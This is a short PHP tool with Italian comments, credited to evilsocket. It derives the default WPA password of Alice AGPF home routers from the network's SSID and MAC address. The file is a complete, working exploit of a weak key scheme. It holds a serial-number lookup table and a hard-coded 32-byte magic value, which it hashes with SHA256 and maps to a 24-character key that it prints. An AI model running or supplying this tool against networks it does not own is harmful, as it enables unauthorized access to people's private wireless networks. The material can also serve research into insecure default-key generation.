<?php
/***************************************************************************
 *   Alice AGPF WPA Discovery                                              *
 *   by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net      *
 *   based on <http://wifiresearchers.wordpress.com/>                      *
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   (at your option) any later version.                                   *
 *                                                                         *
 *   This program is distributed in the hope that it will be useful,       *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
 *   GNU General Public License for more details.                          *
 *                                                                         *
 *   You should have received a copy of the GNU General Public License     *
 *   along with this program; if not, write to the                         *
 *   Free Software Foundation, Inc.,                                       *
 *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *
 ***************************************************************************/

/*
 * Tabella per il calcolo del seriale.
 *
 * First SSID digits => ( SN1, k, Q )
 */
$SN_TABLE   = array( '96' => array( '69102', 13, 96017051 ),
                     '93' => array( '69101', 13, 92398366 ),
                     '56' => array( '67902', 13, 54808800 ),
                     '55' => array( '67904', 8,  55164449 ),
                     '54' => array( '67903', 8,  52420689 ),
                     '48' => array( '67903', 8,  47896103 ),
                     '46' => array( '67902', 13, 39015145 ) );
/*
 * Numeri magici da utilizzare per il calcolo dell'SHA256.
 */
$ALIS       = "\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8";
/*
 * Tabella di conversione da hash a wpa.
 */
$CONV_TABLE = "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuv".
              "wxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123";
/* 
 * SSID della rete.
 */
$SSID       = "Alice-96154825";
/*
 * MAC address del router.
 */
$MAC        = "\x00\x23\x8E\x01\x02\x03";
/*
 * Calcolo il seriale in base al SSID e alla tabella dei valori noti.
 */
$SN         = SSID2SN($SSID);
/*
 * Calcolo SHA256( MagicN + SN + MAC )
 */
$hash       = SHA256( $ALIS.$SN.$MAC );
/*
 * Converto la stringa dell'hash in un array di byte.
 */
$bytes      = hash2bytes($hash);
/*
 * Trovo la WPA utilizzando i primi 24 byte dell'hash come indici della tabella di covnersione.
 */
$wpa   = "";
for( $i = 0; $i < 24; $i++ ){
    $wpa .= $CONV_TABLE[ $bytes[$i] ];
}

echo "WPA : $wpa\n";

/*
 * Funzione per risalire al seriale del router partendo dal suo SSID e utilizzando
 * le tabelle dei valori noti.
 */
function SSID2SN( $ssid ){
    global $SN_TABLE;
    /*
     * Prelevo il numero intero dall'SSID e ne prendo le prime due cifre
     * per verificare che il router sia presente nella tabella.
     */
    preg_match_all( "/^Alice\-([0-9]+)/", $ssid, $m );
    $ssidn = $m[1][0];
    $id    = substr( $ssidn, 0, 2 );

    if( isset( $SN_TABLE[$id] ) ){
        /*
         * Ok, il router � presente nella tabella, prelevo la prima parte del seriale e
         * le costanti k e Q da utilizzare nell'equazione finale.
         */
        $sn1 = $SN_TABLE[$id][0];
        $k   = $SN_TABLE[$id][1];
        $Q   = $SN_TABLE[$id][2];
        /*
         * La seconda parte del seriale equivale a :
         *      (SSID - Q) / k
         */
        $sn2 = ((int)$ssidn - $Q) / $k; 
        /*
         * Restituisco il seriale completo.
         */
        return $sn1.'X'.sprintf( "%07s", $sn2 );
    }
    /*
     * Router non presente nella tabella.
     */
    else{
        die( "La serie 'Alice-$id******' non � presente nella tabella e non � supportata.\n" );
    }
}
/*
 * Funzione per il calcolo di un hash SHA256.
 */
function SHA256( $phrase ){
    return bin2hex( mhash( MHASH_SHA256, $phrase ) );
}
/*
 * Funzione per convertire un hash in un array di byte interi.
 */
function hash2bytes( $hash ){
    preg_match_all( "/[a-f0-9]{2}/i", $hash, $hash_bytes );
    $bytes = array();
    foreach( $hash_bytes[0] as $byte ){
        $bytes[] = hexdec($byte);
    }
    
    return $bytes;
}

?>